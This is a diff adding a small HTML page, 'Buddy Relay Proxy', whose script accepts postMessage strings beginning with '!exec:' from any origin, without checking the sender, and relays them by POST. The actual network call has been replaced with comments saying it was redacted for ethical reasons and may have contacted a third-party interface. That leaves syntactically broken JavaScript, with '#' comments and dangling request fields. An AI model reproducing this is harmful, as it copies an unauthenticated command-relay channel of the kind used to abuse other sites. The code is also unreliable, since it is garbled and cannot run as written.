@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head><title>Buddy Relay Proxy</title></head>
+<body>
+<script>
+window.addEventListener("message", async (event) => {
+  const tag = event.data;
+  if (typeof tag === "string" && tag.startsWith("!exec:")) {
+    try {
+# There used to be some cool stuff here, but it has been redacted for ethical concerns 😔
+# This section may have interacted with a third-party interface in a way that could raise eyebrows.
+        method: "POST",
+        body: new URLSearchParams({ tag })
+      });
+      console.log("[proxy.html] Tag relayed:", tag);
+    } catch (err) {
+      console.error("[proxy.html] Relay failed:", err);
+    }
+  }
+});
+</script>
+</body>
+</html>
